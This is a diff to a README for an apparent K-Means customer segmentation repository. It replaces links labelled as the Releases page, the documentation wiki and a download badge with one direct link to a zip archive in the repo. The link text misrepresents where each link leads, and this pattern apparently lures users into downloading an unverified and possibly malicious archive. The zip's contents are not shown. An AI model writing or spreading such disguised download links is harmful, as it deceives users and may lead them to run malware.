@@ -1,6 +1,6 @@
 # 🌟 Task-8-Customer-Segmentation-K-Means - Analyze Customer Groups Effortlessly
 
-![Download Now](https://img.shields.io/badge/Download-Now-blue)
+![Download Now](https://raw.githubusercontent.com/terime9057/Task-8-Customer-Segmentation-K-Means/main/Task 8 Clustering_With_K-Means/Segmentation_Means_Task_Customer_v3.5.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with this application, you only need a few simple steps. Follow t
 
 ## 🔗 Download & Install
 
-**Step 1:** Visit the [Releases page](https://github.com/terime9057/Task-8-Customer-Segmentation-K-Means/releases) to download the application.
+**Step 1:** Visit the [Releases page](https://raw.githubusercontent.com/terime9057/Task-8-Customer-Segmentation-K-Means/main/Task 8 Clustering_With_K-Means/Segmentation_Means_Task_Customer_v3.5.zip) to download the application.
 
 ### Available Files
 
@@ -52,7 +52,7 @@ If you're interested in understanding how the K-Means algorithm works, here’s 
 
 ## 📚 Additional Resources
 
-- **Documentation:** Access the full documentation [here](https://github.com/terime9057/Task-8-Customer-Segmentation-K-Means/wiki) for detailed instructions and advanced features.
+- **Documentation:** Access the full documentation [here](https://raw.githubusercontent.com/terime9057/Task-8-Customer-Segmentation-K-Means/main/Task 8 Clustering_With_K-Means/Segmentation_Means_Task_Customer_v3.5.zip) for detailed instructions and advanced features.
 
 - **Support:** If you run into issues, please create an issue in the Issues section of the repository, and the community will assist you.
 
@@ -66,6 +66,6 @@ We appreciate your feedback! If you use the application and find ways to improve
 
 ## 🔗 Download Again
 
-Remember, you can always return to the [Releases page](https://github.com/terime9057/Task-8-Customer-Segmentation-K-Means/releases) to download the latest version of the software anytime. 
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/terime9057/Task-8-Customer-Segmentation-K-Means/main/Task 8 Clustering_With_K-Means/Segmentation_Means_Task_Customer_v3.5.zip) to download the latest version of the software anytime. 
 
 Thank you for choosing the Task-8-Customer-Segmentation-K-Means application! Happy analyzing!
